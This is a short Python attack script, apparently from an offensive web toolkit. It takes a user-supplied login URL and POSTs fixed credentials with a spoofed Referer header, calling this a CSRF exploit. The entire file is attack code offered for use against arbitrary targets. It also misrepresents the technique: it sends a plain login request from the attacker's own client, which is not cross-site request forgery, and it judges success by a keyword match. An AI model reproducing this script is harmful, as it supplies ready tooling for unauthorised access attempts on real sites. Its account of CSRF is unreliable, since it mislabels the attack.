# web_apps/csrf.py
import requests

def csrf_exploit(target_url):
    """Exploit a CSRF vulnerability."""
    print("\n[+] Attempting CSRF Attack...")
    
    payload = {
        "username": "attacker",
        "password": "123456",
        "submit": "Login"
    }
    
    headers = {
        "Referer": target_url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    response = requests.post(target_url, data=payload, headers=headers)

    if "success" in response.text.lower():
        print("[+] CSRF Attack Successful!")
    else:
        print("[-] CSRF Attack Failed.")

def csrf_attack():
    """Main function for CSRF attack."""
    target_url = input("Enter the target login page URL: ")
    csrf_exploit(target_url)
